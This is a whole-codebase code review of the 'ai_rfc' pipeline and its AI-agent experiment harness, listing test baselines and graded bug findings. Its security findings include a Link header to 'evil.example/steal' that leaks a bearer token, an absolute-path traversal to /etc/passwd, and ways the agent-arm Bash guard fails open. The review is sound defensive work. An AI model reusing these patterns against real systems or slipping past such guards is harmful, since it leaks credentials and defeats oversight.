# `ai_rfc` whole-codebase code review

**Date:** 2026-09-02 · **Branch:** `feat/arfc-pipeline-and-runtime-anchors`, 162 commits
ahead of `production`, no PR · **Plan:** `docs/superpowers/plans/2026-09-02-ai-rfc-code-review.md`

This reviews all 18,443 lines of the `ai_rfc` substrate across both repositories — the
PANTHER-side package (55 files, 6,933 LOC) and the `harness/` git submodule (59 files,
11,510 LOC, pinned at `0b62bf3`) — plus both test trees. It answers three questions: is
the code sound, is technical debt hiding in it, and are the commands and features
finished.

Three decisions frame it. Both repositories are reviewed, but **fixes may land only on
the PANTHER side**, because the submodule's strings are the completed pilot's instrument.
This run **stops at the report**; no source file is edited. And **registered gaps count as
debt** rather than as accepted design, so the prose register is itself under review.

Severity throughout follows one rule: a finding's *existence* is a claim about code, but
its *severity* is a claim about consequence, which usually depends on runtime state. Every
severity line therefore either names the artifact that confirmed it, or carries the check
that would settle it. There is no separate confidence field, deliberately.

## Baseline, 2026-09-02

Everything below was run in this session, in the worktree, before any reviewer read a line.

| Check | Command | Result |
|---|---|---|
| PANTHER `ai_rfc` suite | `pytest tests/unit/…/ai_rfc/ tests/unit/test_cli/test_ai_rfc_commands.py -n auto` | **390 passed**, 11 warnings, 17.26s |
| harness experiment suite | `pytest harness/experiment/tests/` | **339 passed**, 92.80s |
| harness server suite | `pytest harness/plugins/ai-rfc/server/tests/` | **40 passed**, 24.37s |
| mypy, PANTHER-side | `mypy --follow-imports=silent` on the 8 non-harness subtrees | **10 errors in 6 files**, 55 source files checked |
| mypy, whole tree | same, including `harness/` | 24 errors in 17 files, 114 checked |
| black, PANTHER-side | `black --check` on the 8 non-harness subtrees | **clean — 55 files unchanged** |
| black, whole tree | same, including `harness/` | 4 would reformat, all under `harness/` |
| flake8, PANTHER-side | `flake8 --max-line-length=88` on the 8 non-harness subtrees | **clean — 0 findings** |
| flake8, whole tree | same, including `harness/` | 49 findings, all under `harness/` |

**All three suites pass with zero failures**, totalling 769 tests.

Two invocation notes, both of which cost time to rediscover. `ruff` is *not* installed in
`.venv` — it exists only as a `.pre-commit-config.yaml:32-35` hook that fetches its own
environment, so `.venv/bin/ruff` fails outright. And `flake8` must be given
`--max-line-length=88` explicitly, because it defaults to 79 and runs at
`stages: [manual]`, so its bare output is dominated by E501s that pre-commit would never
raise.

### Three corrections to the expected baseline

**The "587" figure this review expected for the PANTHER suite was a misattribution.** It
was a cross-suite sum recorded at an earlier date, not the count of one suite. Measured
today, every suite has *grown*: 390 / 339 / 40 against the remembered 286 / 263 / 38. No
tests were lost, and nothing regressed.

**PANTHER-side formatting and linting are spotless.** All 4 black reformats and all 49
flake8 findings are inside the `harness/` submodule, a separate repository with its own
conventions that is out of scope for fixes. A single tree-wide number would have
understated the package and overstated the submodule.

**`types-PyYAML` is neither declared nor installed, and it degrades the type baseline.**
`pyproject.toml:98` declares `PyYAML>=6.0,<7.0` as a runtime dependency, but no stub
package accompanies it and `.venv` contains none. Eight of the ten PANTHER-side mypy
errors trace to this one gap: four are `Library stubs not installed for "yaml"`
(`schema.py:14`, `report.py:14`, `coverage/cli.py:11`, `draft/gate.py:18`), and four more
are `Returning Any from function declared to return "str"` at exactly the points where a
`yaml.safe_load` result is returned (`schema.py:207`, `report.py:128`,
`draft/questions.py:153`, `timeline/store.py:87`) — which is what an untyped `yaml` module
produces downstream. The consequence is that **mypy is not checking any YAML-handling path
in a package whose central artifact is a YAML manifest.** The two remaining errors are
independent: a missing annotation for `fragment` at `coverage/cli.py:109`, and one further
`Returning Any`.

SEVERITY: Important — confirmed against `pyproject.toml`, which declares `PyYAML` at line
98 with no `types-PyYAML` beside it, and against `.venv/lib/python3.10/site-packages/`,
which holds `pyyaml-6.0.3.dist-info` and no `types_pyyaml`.

## Established facts

Exploration produced six claims that were never checked, by the same agent pair that also
produced one fabricated quotation and one wrong marker count. Every row below was
re-derived by running the command shown. They are stated here as fact so that the slice
reviewers receive them as settled and spend their budget elsewhere.

| # | Claim | How it was checked | Verdict |
|---|---|---|---|
| F-1 | No `TODO`/`FIXME`/`HACK`/`XXX`/`NotImplementedError`/skip/xfail/`type: ignore` anywhere | `grep -rnE` over the package and both test trees | **Confirmed.** Zero of every one of those classes. |
| F-2 | Zero lint suppressions | same grep | **Refuted.** Seven `# noqa`, all under `harness/`, each with a stated reason. See *Debt backlog*. |
| F-3 | All 13 PANTHER-side verbs have tests | grep each verb across `tests/unit/…/ai_rfc/` | **Confirmed.** |
| F-4 | 8 of 16 MCP tools have no test at the tool boundary | grep each `ai_rfc_*` symbol across the server test tree | **Confirmed exactly.** |
| F-5 | 4 verbs have no test at either layer | grep each verb string across the server test tree | **Confirmed.** |
| F-6 | `preflight`, `render`, `workspace reseal` never reached through `cli.main` | grep `main([...])` invocations across `harness/experiment/tests/` | **Confirmed.** |
| F-7 | No flag is defined but never read | extract every `"--flag"`, then grep its `args.*` consumption | **Confirmed**, after correcting a naive check — see below. |

### F-2: the seven suppressions

`experiment/guard.py:15` (E402) · `experiment/guard.py:59` (BLE001, "blocking is the only
safe exit") · `experiment/workspace.py:126` (ANN202) · `server/tests/conftest.py:13`
(E402) · `server/cli.py:303` (BLE001, "substrate errors surface verbatim") ·
`core/claims.py:41` (ANN202) · `core/questions.py:13` (ANN202, the only one with no
stated reason).

### F-4 and F-5: the untested surfaces

The eight tools with no test at the tool boundary are `ai_rfc_status`,
`ai_rfc_corpus_query`, `ai_rfc_cluster_get`, `ai_rfc_question_draft`,
`ai_rfc_question_export`, `ai_rfc_answer_record`, `ai_rfc_gate` and
`ai_rfc_citation_gate`. Their *core* functions are tested in `test_core.py`; what is
untested is the wrapper each MCP client actually calls, and its registration through
`server.py`'s `ALL_TOOLS` loop.

Four of those are untested at the CLI layer too, so they have no test on **either**
surface a user or an agent can reach: `cluster-get`, `question-draft`, `question-export`
and `answer-record`.

SEVERITY: Important — confirmed against the server test tree, where a grep for each of
the sixteen tool symbols and each of the sixteen verb strings returns no file for these
four. `answer-record` is the load-bearing one: it is the human sign-off path, and the
package README names developer sign-off as one of only two mechanisms that can move
`checked_fraction` off zero. Both of its entry points are unexercised.

### F-6: the three unreached experiment verbs

`preflight`, `render` and `workspace reseal` have tested functions
(`test_preflight.py`, `test_render.py`, `test_workspace.py:207`) but no test that reaches
them through argparse. Only one of the three declares this: `experiment/preflight.py:1-7`
states "Nothing here runs under pytest; the pure parts are tested, the calls are made once
by hand." `render` and `workspace reseal` carry no such statement, so two of the three
gaps are undeclared.

### F-7: the correction, recorded because the naive check was wrong

A first pass extracting every `"--flag"` and grepping for `args.<flag>` reported three
unread flags: `--from`, `--json` and `--version`. All three were false positives.
`pipeline/cli.py:61,93` give `--from` and `--json` explicit `dest="start"` and
`dest="as_json"` — `from` is a Python keyword and cannot be an attribute name — and
`args.start`, `args.until` and `args.as_json` are read 3, 2 and 2 times respectively.
`--version` is `action="version"`, which argparse consumes internally. The four `dest=`
declarations PANTHER-side are `as_json`, `start`, `until` and `verb`, and every one is
read. **No flag is defined but never read.**

## Raw findings

Five reviewers read disjoint slices. Findings are reproduced as filed, with the reviewer's
own severity line. Nothing here is a verdict yet — Task 4 settles the residual conditions.

Every reviewer was told to prefer settling to hedging, and most did: the majority of the
severity lines below say "confirmed against" a probe or an artifact rather than carrying a
condition. That is the single biggest difference from the 2026-08-31 review.

### Reader `core` — package root, `draft/`, `pipeline/`, the click front door (3,444 LOC)

**Strengths.** `test_promotion.py:90-109` asserts that interview+paper and interview+ADR
*stay* at `inferred` — the two-narrative-source route a lazy suite would omit, and exactly
the circularity `PRIMARY_EVIDENCE` exists to block. `models.py:154-169` reports
`confirmed_count_by_req_class` beside the fraction, with a docstring naming the reason:
`0.0` has two readings and only the denominator says which. `report.py:28-35` with
`cli.py:99-104` makes "no findings" distinguishable from "nothing checked".
`state.py:215-229` counts checkpoints per cluster id and requires the record, because a
bare directory reads as a false "2 of 2".

**core-01** · `pipeline/state.py:307`, `pipeline/cli.py:152-157` · correctness
`next_stage` skips `RECOMPUTED` stages, and both `check` and `gate` are `RECOMPUTED`
(`state.py:276,279`), so a default `pipeline run` jumps from `views` to `prose` and never
validates the manifest — contradicting `State.RECOMPUTED`'s own docstring at
`state.py:46-49` ("the runner just performs it").
SEVERITY: Critical — confirmed against a probe workspace holding a manifest whose stored
`confirmed` rests on one ADR anchor: `pipeline run <ws> --strict --json` exits **0** with
`performed: []`, while `pipeline run <ws> --from check --strict` on that same workspace
exits **3** reporting the violation. No test in `pipeline/test_cli.py` runs past mining,
so this is not encoded intent.

**core-02** · `draft/checkpoint.py:69,74-98` · correctness
`write_checkpoint` creates the directory and writes `manifest.yaml` before reading
`timeline.json`, so a failure there leaves a directory that `:69` then refuses to
overwrite forever; `state.py:221-224` counts it as unfrozen and routes the operator
straight back into the refused stage.
SEVERITY: Critical — confirmed: first run exits 1 leaving `['manifest.yaml']`, and after
repairing the input the retry exits 1 with "already exists; a checkpoint is written once".
Recovery is an undocumented manual `rm -rf`. Fix: digest `timeline.json` before `mkdir`,
or write to a temp dir and rename.

**core-03** · `schema.py:141` · correctness
`yaml.safe_load` silently keeps the last of two identically-keyed requirements, so a
manifest with a duplicated id loses a claim and `claim_count` under-reports with no
diagnostic.
SEVERITY: Important — confirmed: two `"R1"` entries load as 1 claim, text `second`.
Duplicates are discarded before `sorted(requirements.items())` at `:152` can see them, so
the fix is a `SafeLoader` subclass with a duplicate-key constructor, not a post-parse check.

**core-04** · `anchors.py:75`, `schema.py:79` · correctness
The module docstring refuses unpinned anchors because "a `path:line` reference into a
moving tree silently points at different code", but `commit` is only `str()`-coerced, and
`git cat-file -e HEAD^{commit}` resolves — so `commit: HEAD` or a branch name verifies
against a moving reference and looks pinned.
SEVERITY: Critical if any authored manifest carries a non-40-hex commit; Minor otherwise —
settled by grepping authored workspace manifests for `commit:` values that are not 40 hex.
A repo-wide grep returns nothing (manifests are written at run time into workspaces the
reviewer could not reach), and `test_anchors.py:22` only ever pins a resolved
`rev-parse HEAD` result, so no negative test exists either.

**core-05** · `draft/gate.py:274-283` · correctness
**S-5 confirmed.** The "no normative change" check compares cited claim id sets. A
revision that rewrites a cited claim's text while citing the same ids passes. Content is
never hashed, though `checkpoint_manifest_sha256` is already in hand and would make that
cheap.
SEVERITY: Important — confirmed by reading; the comparison at `:280` is
`cited_by_tag[entry.tag] != previous_cited`, both `set[str]` of ids.

**core-06** · `schema.py:138,141`; `draft/gate.py:74`; `draft/questions.py:118`;
`pipeline/state.py:205` · api-contract
`yaml.YAMLError` is neither a `SchemaError` nor an `OSError`, so a YAML *syntax* error
escapes every handler in the slice, though `schema.load`'s `Raises:` promises
`SchemaError` "if the document is malformed". `state.py:90`'s `_read_json` catches
`ValueError` precisely so a half-written artifact reports `STALE`; the YAML twin at `:205`
does not.
SEVERITY: Important — confirmed: `pipeline status` on a workspace whose `manifest.yaml`
has an unclosed bracket prints a traceback instead of reporting `stale`, during the
agent-authoring phase that state exists to describe.

**core-07** · `draft/completeness.py:194-197` vs `draft/gate.py:255-257` · api-contract
`run_gate` skips a revision whose tag is absent from the repo and records a finding;
`citation_gaps` calls `cited_ids` unconditionally and raises `CompletenessError`. A
registered-but-untagged revision therefore makes `draft completeness` exit **1** ("input
unreadable") where `gate` exits **3** ("finding") — and an incomplete reconstruction is
the exact thing `completeness` was built to measure.
SEVERITY: Important — confirmed by reading both paths; `gate.py:256` carries the
`if entry.tag not in tags: continue` guard, `completeness.py:194` carries none.

**core-08** · `draft/gate.py:112-116`, `draft/checkpoint.py:33-36`,
`pipeline/state.py:174-176`, `draft/completeness.py:48-57` · duplication
Four separate readers of `clusters.jsonl`. Only `completeness.load_clusters` filters blank
lines and wraps `JSONDecodeError`; the other three `json.loads` every line and index
`["id"]`/`["ordinal"]` bare.
SEVERITY: Important — confirmed: a trailing blank line in `clusters.jsonl` makes
`pipeline status` traceback. One shared reader fixes all three.

**core-09** · `promotion.py:70`, `schema.py:119` · correctness
`signed_off_by` is the single strongest promotion lever and is accepted as any non-empty
string, unstripped — unlike `text`, which `schema.py:104` strips.
SEVERITY: Important — confirmed: a claim with one ADR anchor and `signed_off_by="   "`
adjudicates to `confirmed`.

**core-10** · `draft/gate.py:274-279` · correctness
When the predecessor revision's tag was unreadable it is absent from `cited_by_tag`, so
`previous_cited` falls back to `set()` and a genuinely unchanged revision is reported as
having changed its cited set.
SEVERITY: Minor — confirmed by reading; it adds a spurious second finding beside the real
one.

### Reader `evidence` — `forge/` `history/` `timeline/` `views/` `coverage/` (3,532 LOC)

Baseline for this slice: 155 tests pass. Every finding below is a green-suite finding.

**Strengths.** `views/emit.py:21-40` — `_DIFF_ARGS` neutralises every gitconfig drift
source the reviewer could name (`--no-ext-diff`, `--no-textconv`, `--no-renames`,
`--full-index`, explicit prefixes, pinned algorithm), with the reasoning recorded.
`coverage/commit.py:55-61` — `rev-parse --verify <rev>^{commit}` plus a comment naming the
plain-`rev-parse` trap it replaced (which exits 0 for any 40-hex string).
`history/git_log.py:105-118` — NUL records, `maxsplit`, and a field-count guard kept
deliberately after `maxsplit` made it redundant. `views/emit.py:313` correctly reports
drift when verify mode differs from emit mode; the reviewer checked this is not accidental.

**evidence-01** · `history/git_log.py:141-142`, `views/emit.py:289`,
`timeline/build.py:142` · correctness
`--no-merges` gives every merge commit `file_count=0` and zero file rows, so a merge's own
first-parent diff is invisible in `files.jsonl`; `views` compensates by unioning members,
which fails exactly when the merge introduces content of its own. Probe: a merge adding
`resolved.txt` during resolution produced `view.json file_set=[s.txt, s2.txt]` beside a
`span.diff` touching `resolved.txt`, with `files_complete: true`. Three documents ride on
this: `git_log.py:141` claims merges "produce no diff against their first parent" (the
probe's merge diffs 3 paths); `models.py:35` and the README field table call `file_count`
"the **true** number of paths the commit touched"; and `files_complete` means only "no
commit hit the cap".
SEVERITY: Critical if any merge on the target's spine has a non-empty first-parent diff;
Important otherwise — settled by listing merge commits' own first-parent name-only output
over the clone and counting non-empty lines.

**evidence-02** · `forge/fetch.py:131-135` · security
`_paginated_github` takes the next URL from the remote's `Link` header and passes it to
`_get_json`, which attaches `Authorization` (`:109-110`) with no host check. The same loop
has no page bound, so a self-referential `Link` runs forever.
SEVERITY: Critical — confirmed against an injected-transport run: a page-1
`Link: <https://evil.example/steal>; rel="next"` produced a second call to
`https://evil.example/steal` carrying `Authorization: Bearer SECRET-TOKEN`.

**evidence-03** · `forge/fetch.py:52-53`, `forge/store.py:43-45` · security
`api_base` ignores `self.host` when `kind == "github"`. Confirmed:
`parse_url("https://github.enterprise.example/org/proj", "github")` yields host
`github.enterprise.example` and api_base `https://api.github.com/repos/org/proj`, so
`GITHUB_TOKEN` goes to api.github.com, and `meta.json` then records
`api_base: https://api.github.com` beside `host: github.enterprise.example`. The `--host`
help at `cli.py:57-61` explicitly invites this ("pass this explicitly for a self-hosted
instance").
SEVERITY: Critical if GITHUB_TOKEN is set while `--host github` targets a non-github.com
host; Important otherwise — settled by whether any recorded invocation does so.

**evidence-04** · `coverage/cli.py:131` · correctness
The provenance record writes `"commit": args.commit`, the ref as typed, while
`propose.py:73-76` argues at length that only the resolved sha may be recorded. Confirmed:
`--commit main` produced `runtime-anchors.json` with `"commit": "main"` beside a proposal
carrying `004bdf65…`. `SkippedAnchor` (`propose.py:37-44`) has no commit field, so in
MARK's zero-proposal case the artifact records no resolved sha at all.
SEVERITY: Important — confirmed against `runtime-anchors.json`, which shows two spellings
of "the commit" in one file.

**evidence-05** · `tests/…/coverage/test_propose.py:93-104` · test-gap
`test_the_provenance_names_what_the_anchor_actually_claims` asserts
`record["commit"] == commit`, but the `java_repo` fixture supplies an already-resolved
sha, so it cannot distinguish `args.commit` from `proposal.commit`. It is the named guard
for evidence-04 and passes against the defect.
SEVERITY: Important — confirmed against the fixture at `coverage/conftest.py:40`, which
returns a resolved HEAD.

**evidence-06** · `timeline/corpus.py:51` · api-contract
`json.loads(line)` sits outside the `try` that converts failures to `TimelineError`, and
`cli.py:98` catches only `(TimelineError, OSError)`. Confirmed: a corpus with a trailing
blank line and one with non-JSON both raised an uncaught `JSONDecodeError` instead of
exiting 1. `history/store.py:142` filters blank lines and `timeline/cli.py:125` catches
`ValueError` for the forge snapshot — the corpus path is the inconsistent one.
SEVERITY: Important — confirmed against a run, which tracebacks where the contract
specifies exit 1.

**evidence-07** · `forge/store.py:118-141` · correctness
`mkdir` at `:124` precedes the sort keys that raise, so a malformed record leaves a
half-created snapshot that the write-once rule at `:119` then refuses to replace;
`KeyError` is outside `cli.py:180`'s catch. Confirmed:
`write_snapshot(..., pulls=[{}], ...)` raised uncaught `KeyError: 'number'` and left an
empty snapshot directory. `adopt.py:5-8` promises "an adopted snapshot cannot carry
anything a fetched one could not", but `read_records` validates only that sections are
lists of dicts.
SEVERITY: Important — confirmed against a run, which left the directory on disk.

**evidence-08** · `views/emit.py:260` · correctness
`emit_views` reads `forge_snapshot` with no comparison against
`timeline["forge_snapshot"]["meta_sha256"]`, and `source` at `:263-267` records no
snapshot identity, so `evidence/pr.json` cannot be traced to the snapshot it came from and
`--verify` cannot detect a swapped one. This is the substantive extension of S-6: the
module docstring's "every input is digest-guarded" is false for the forge snapshot.
SEVERITY: Important if views are ever emitted with `--forge` against a re-fetched
snapshot; Minor otherwise — settled by whether more than one snapshot directory exists for
a target.

**evidence-09** · `forge/cli.py:212-214` · correctness
`fidelity_ceiling` is keyed on token presence, not on observed denials, so an anonymous
run that fetched full discussion with zero denials is graded `"pulls"`.
`pipeline/state.py:134-135` reads exactly this to decide whether a snapshot is
route-capped. The record that anonymous MARK fetches work and produced enrichments makes
this the live path, not a hypothetical one.
SEVERITY: Important — confirmed against `pipeline/state.py:134-135`, which grades on the
value.

**evidence-10** · `views/emit.py:271-272` · correctness
`cluster_dir.mkdir(exist_ok=True)` never prunes, so re-emitting after a rebuilt timeline
leaves orphan cluster folders from the previous generation beside the current ones, and
`verify_views` iterates only `emitted` so it never inspects them.
SEVERITY: Important if `--out` is reused across timeline rebuilds; Minor otherwise —
settled by whether the pipeline emits into a fresh directory each run.

**evidence-11** · `coverage/jacoco.py:65-66` · api-contract
`int(number)` and `int(line.get("ci","0"))` raise bare `ValueError` on well-formed XML with
a malformed attribute; `cli.py:104` catches
`(SchemaError, CoverageError, PinError, OSError)`. Confirmed: `read()` on `ci="many"`
raised `ValueError: invalid literal for int()`.
SEVERITY: Important if a coverage producer ever emits a non-integer counter; Minor
otherwise — settled by whether any real report does; the reviewer could not reach one.

**evidence-12** · `history/aggregates.py`, whole file (56 lines) · dead-code
`history_shape`/`HistoryShape` are exported from `history/__init__.py` and referenced only
by `tests/…/history/test_aggregates.py`; no production caller anywhere in the package or
its docs.
SEVERITY: Minor — confirmed against a repo-wide grep for both names.

**evidence-13** · `tests/…/views/conftest.py:33` · test-gap
The fixture's only merge is clean, so union-over-members always covers it and the suite
structurally cannot observe evidence-01.
SEVERITY: Important — confirmed against the fixture, which merges `feat` with no
resolution step.

**evidence-14** · `history/index.py:123-133` · resource
Distinct from the declared design at `:111-112`: when `_digest` at `:126` raises
`FileNotFoundError` for a missing JSONL, the connection opened at `:123` is never closed —
only the stale-digest path closes it. The docstring declares neither that leak nor the
`sqlite3.OperationalError` a corrupt index raises at `:124`.
SEVERITY: Minor — confirmed by reading; the leak is bounded by process lifetime.

**evidence-15** · `forge/fetch.py:150` · correctness
`int(next_page)` raises an uncaught `ValueError` on a non-numeric `x-next-page`, and a
server repeating the same page number loops forever. Sibling of evidence-02 on the GitLab
side.
SEVERITY: Minor — confirmed by reading; requires a misbehaving or hostile instance.

**evidence-16** · `history/git_log.py:188` · correctness
Commit markers are detected by a leading `\x01`, which is permitted inside a path, so a
path starting with `\x01` is parsed as a commit marker and misattributes the rows that
follow. Same class as README trap 1, unlisted for the file-changes pass.
SEVERITY: Minor — confirmed by reading; pathological input.

**evidence-17** · `timeline/build.py:108-115`, `views/emit.py:122` · correctness
Two merged pulls sharing a landing sha silently collapse (`forced[sha] = pull`), as do two
pulls sharing a number in `_read_forge_records`; neither appears in `cli.py:171-176`'s
unmatched count, so the reported enrichment total and the actual attribution can disagree
with no diagnostic.
SEVERITY: Minor — confirmed by reading; requires duplicate landing shas or numbers.

**evidence-18** · three small items, each confirmed by reading · correctness
`timeline/build.py:130` records `subject_pr_hint` only for PR clusters, so a direct-push
commit carrying `(#N)` — the default squash subject — loses its hint in an epoch cluster,
which is where a forge-less run needs it most. `timeline/store.py:66` writes a bare
newline for an empty cluster list where `forge/store.py:50` handles the same case
correctly (unreachable via the CLI today). `coverage/propose.py:136` rebuilds the `known`
suffix set on every anchor, making resolution O(anchors × report lines).
SEVERITY: Minor — confirmed by reading; none changes a recorded value today.

**Known items, this reader's verdicts.** S-3 confirmed at `fetch.py:97`. S-4 confirmed at
`fetch.py:112-113`, with the added detail that `cli.py:213` grades on `result.throttled`
without being able to tell the two apart. S-6 confirmed at `emit.py:313-318`; the reviewer
judges evidence-08 the substantive part of that gap rather than the docstring wording.
`open_index`'s declared non-closing return at `:111-112` is adequate for the happy path —
the README teaches closing explicitly — and evidence-14 is the undeclared residue.

**Assessment.** The slice is sound in construction — the determinism, digest-guarding and
refuse-rather-than-guess discipline are genuinely careful, and most of what was found sits
at the edges of that discipline rather than in its middle. Fix evidence-01 first: it is the
one wrong number that looks right in the artifact a human actually reads, and it needs a
design decision (record the merge's own first-parent diff, or drop the "true count" claim
and rename `files_complete`) rather than a patch. evidence-04 is the cheapest Important —
one identifier.

### Reader `server` — `harness/plugins/ai-rfc/server/src/ai_rfc_server/` (1,659 LOC)

**Partial.** This reader's delivery was truncated after server-03; the remainder was
requested and is appended below when it arrives. The reviewer separately reported that
server-22 (an `mcp>=1.0` lower bound) is the one item it could not settle, because PyPI is
unreachable through the sandbox proxy; it stands as conditional with the settling command
named.

**Strengths.** `claims.py:60-66` — every manifest write round-trips through the
substrate's strict schema in a scratch directory *before* `os.replace`, so an invalid
manifest cannot land; `upsert_claim:118` then re-reads from disk and returns what actually
stored rather than echoing the input. `claims.py:22-36,95-99` — `status` is excluded from
`_WRITABLE_FIELDS` *and* separately rejected with an explanatory message, so an agent
cannot assert a standing its evidence does not support. `draft.py:114-140` —
tag-then-verify-then-delete, with the ordering rationale at `:76-79` explaining why the
citation gate cannot run first, and `rolled_back` reported rather than hidden.
`pyproject.toml:13-19` — the version pin carries the incident that motivates it, including
the failure mode (tools silently absent, session still "succeeds").

**The decisive fact this reader established.** `promotion.py:70` is
`if claim.signed_off_by: return Status.CONFIRMED` — a sign-off promotes a claim straight
to the top status, bypassing every evidence-class rule. Several findings below and
core-09 all terminate here.

**S-1 confirmed** (`queries.py:22,58`). The cap is disclosed in both frontends' help text
(`tools.py:24`, `cli.py:50`) but never in the *return value*, and `fetchmany` never learns
the total — so an agent knows a cap exists and cannot tell whether it bit. Judging the
remedy as well as the defect: the rationale at `:16-21` ("a query needing more rows is a
query that should be narrowed") is self-defeating, because an agent cannot narrow a query
it does not know was truncated; the fix must change that comment, not only the code. The
minimum honest form is `fetchmany(_ROW_CAP + 1)` returning `{rows, truncated}`, matching
the pattern `:109-110` already names. That is a list→dict wire change for the CLI's JSON
consumer, and `test_parity.py` covers no `corpus-query` pair, so a parity test must land
with it.

**S-2 confirmed** (`questions.py:157`), and the sharper vector is an **absolute** path
rather than `../`: `Path("/ws")/"interviews"/"/etc/passwd"` is `/etc/passwd` — pathlib
discards the left operand entirely — and `transcript.rsplit(".",1)[0]` at `:184` then
records that clean absolute path as the evidence locator. The same unsanitized join
recurs at `queries.py:118` (`cluster_id`), `gates.py:58` and `revisions.py:41`, and
`gates.py:52-55` passes `--cluster <id>` to a substrate that creates `--out/<id>/`.

**server-01** · `questions.py:163` · security/correctness
`quote not in transcript_path.read_text()` — `"" in anything` is True, so `quote=""`
passes the only check that an answer happened. `cli.py:137`'s `required=True` does not
exclude `--quote ""`, and the tool has no minimum. Combined with S-2 this reduces the
sign-off precondition to "some readable file exists".
SEVERITY: Critical — confirmed against `promotion.py:70`, where `signed_off_by` returns
`Status.CONFIRMED` unconditionally, so this path writes the top status with no evidence.

**server-02** · `questions.py:62-67` · correctness
`question_id` is only auto-allocated when `None`; an explicit id is never checked for
collision, and `dump_questions` (`draft/questions.py:138-152`) renders
`rendered[question.id] = body`, a dict keyed by id. So `[*existing, entry]` at `:77`
**silently overwrites** an existing register entry, including a recorded human answer, and
the return value reports success. Exposed on both frontends (`tools.py:67`,
`cli.py:117-119`).
SEVERITY: Critical — confirmed against `draft/questions.py:152`, which keys by id, making
the overwrite silent and unrecoverable from the register.

**server-03** · `questions.py:154,170-179` · correctness
Only existence is checked; the entry is unconditionally rebuilt as `ANSWERED`. A withdrawn
question becomes answered, and re-answering overwrites `answer`/`answered_by`/
`answered_at` — so a second call with `author_confirmed_exact_text=True` grants the
sign-off the first call withheld.
SEVERITY: Important — confirmed against `draft/questions.py`.

### Reader `runner` — `harness/experiment/` source (5,345 LOC)

**Partial.** Truncated inside runner-04; the remainder was requested.

This reviewer verified read-only and, importantly, **deliberately did not run the `audit`
or `analyze` CLI verbs against the pilot**, because both overwrite `audit/` and
`analysis/` in place. Every recomputation was done by calling the pure functions in
memory. That restraint is what made runner-01 findable without destroying the evidence it
rests on.

**Strengths.** `audit.in_arm` (`audit.py:190-192`) decides Bash by calling
`enforcement.is_allowed` — the same function the live guard runs — instead of the surface
label, which is the one place a second reader would have drifted. The reviewer checked the
remaining derived pair: `bash_prefixes` yields `('ai_rfc ',)` and
`('python -m …ai_rfc', 'git ', 'sqlite3 ')`, `_stage_surface` maps each to its family, and
**they still agree**. `stream.merge_results` (`:189-234`) sums cost across per-session
result events rather than taking the tail. `metrics._arm_summary` reports
`runs_with_unknown_cost` and `runs_with_broken_surface` beside the figures they were
excluded from, instead of folding unknown into zero. `guard.py:39-45` rejects non-dict
payloads before `.get`, closing the path where an exception would exit 1 and allow.

**runner-01** · `metrics.py:494-518`, `audit.py:403-416`, `config.py:334-355` · correctness
Nothing compares a frozen campaign's `git`/`prompt_sha256`/`plugin_root` against the
running checkout, yet every constant that classifies a transcript (`arms.RAW_PREFIX`,
`Bash(ai_rfc *)`, `audit._stage_surface`, `classify`'s `mcp__ai_rfc__`,
`stream.ai_rfc_connected`, `metrics._cluster_of_call`) is a literal that moves with a
rename; `campaign.git` is only copied into the aggregate for display (`metrics.py:526`).
Re-running today's code over the **unchanged** pilot transcripts flips B1 `integrity`
True→**False** with 177 fabricated `executed_out_of_arm` entries, C1 → False with 41, A1 →
False with 170 **and** `surface.intact` False (its server is named `arfc`), which drops
both arm-A runs from `_arm_summary` so arm A reports `runs: 0` and dashes for every
figure. `checkpoint_calls` returns 0 for B1 (stored: 11) → `auc` 0.0,
`tokens_to_first_completion` None. `cli.analyze` calls `audit_campaign` **first**, which
rewrites all six `audit/*.json` in place, and only then reaches `run_gates`, which would
ImportError because `campaign.plugin_root` no longer exists — destroying the evidence
without producing a replacement.
SEVERITY: Critical — confirmed against
`~/arfc-experiments/campaigns/pilot-aioquic-w02-11-20260831`, whose stored audits show
`integrity: true` and surfaces `bash:arfc`/`bash:python_a_rfc`/`mcp` while today's code
recomputes `integrity: false` and `bash:other`/`mcp:other` from the identical bytes. The
pilot's own `audit.pre-mixed-family-fix/` directory shows this overwrite path is already
live.

**runner-02** · `audit.py:263-274` · correctness
`guard_stats` counts `hook_started` only. The stream also carries `hook_response` with
`exit_code` and `outcome` (verified: 180 in B1, 120 in C1, exit_code 2 on a real denial),
so a guard that starts and then fails open — exit 1 is *allow* — still scores
`fired_for_every_bash_call: True`. This is the evidence that would settle runner-03 and
runner-04, and it is not read.
SEVERITY: Important if a guard ever exits anything but 0 or 2; Minor otherwise — settled
by tallying `hook_response.exit_code` per run, which for the pilot is 2 on every denial.

**runner-03** · `guard.py:13-15` · security
`from experiment.enforcement import is_allowed` sits outside the `try` at `:57` that
exists precisely because "an exception escaping main() would exit 1, and 1 does not
block". An ImportError there — harness moved, `enforcement.py` broken mid-campaign — exits
1 and the command runs, defeating the only real arm separation.
SEVERITY: Important if the import can fail during a campaign; Minor otherwise — settled by
runner-02's `hook_response.exit_code` tally, which no run currently inspects.

**runner-04 onward** — pending; truncated in delivery.

### Reader `tests` — all three test trees (10,387 LOC)

**Partial.** Truncated inside tests-07; the remainder was requested.

**Strengths.** `harness/experiment/tests/test_metrics.py:164-189` — the unknown-cost test
asserts both that an unpriced run is excluded *and* (`:186-188`) that a priced failure
still scores 0.375, so the metric cannot pass by being always-zero; same discipline at
`:258-291` for void runs. `test_enforcement.py:54-68` — adversarial allowlist cases
(command substitution, backticks, `| sh`, the empty string), each asserted blocked, not a
happy-path allowlist test. `test_cli_conventions.py:125-127` guards its own vacuous pass
before comparing sets. `draft/conftest.py:41-55` builds the timeline fixture *through the
shipped code* (`read_commits` → `build_timeline` → `write_timeline`) rather than
hand-writing JSON, so fixture and production cannot drift apart.

**tests-01** · `harness/plugins/ai-rfc/server/tests/test_parity.py:85` · test-gap
`test_every_tool_is_in_the_parity_table` greps the whole `parity.md` text for
`` `<tool_name>` ``, so a row stripped to its name (empty verb and substrate columns)
passes — and, with no vacuous-pass guard like `test_cli_conventions:125-127`, a tool
deleted from `ALL_TOOLS` leaves its row standing, green.
SEVERITY: Important — confirmed against `tools.py:135-152` (16 tools) and
`harness/docs/parity.md:10-25` (16 rows), where the suite makes cross-arm assertions for 5.

**tests-02** · `harness/docs/parity.md:4-5` · doc-drift
The document states the suite "keeps every write byte-identical and every read
JSON-identical across arms". Five tool↔verb pairs have such an assertion (`claim_upsert`,
`claim_record_status`, `claim_adjudicate`, `draft_commit`, `revision_tag`); the
`cluster_next`/`checkpoint`/`revision_record` calls at `test_parity.py:116-120` run through
`tools.*` on *both* arms, so they are setup, not parity.
